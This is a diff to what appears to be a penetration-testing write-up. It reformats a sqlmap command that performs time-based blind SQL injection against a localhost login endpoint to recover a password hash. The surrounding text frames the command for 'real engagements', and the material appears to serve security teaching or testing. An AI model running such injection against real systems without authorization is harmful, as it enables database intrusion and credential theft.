@@ -173,14 +173,16 @@ echo ""
 echo "Recovered hash: ${HASH}"
 ```
 
-> In a real engagement, use **sqlmap**: `python sqlmap.py -u 'http://localhost:5001/bff/auth/login' \
+> In a real engagement, use **sqlmap**:
+```
+python sqlmap.py -u 'http://localhost:5001/bff/auth/login' \
   --data '{"username":"*","password":"x"}' \
   --technique=T \
   --dbms=PostgreSQL \
   --level=5 \
   --ignore-code=401 \
   --headers="Content-Type: application/json"
-`
+```
 
 ---
 
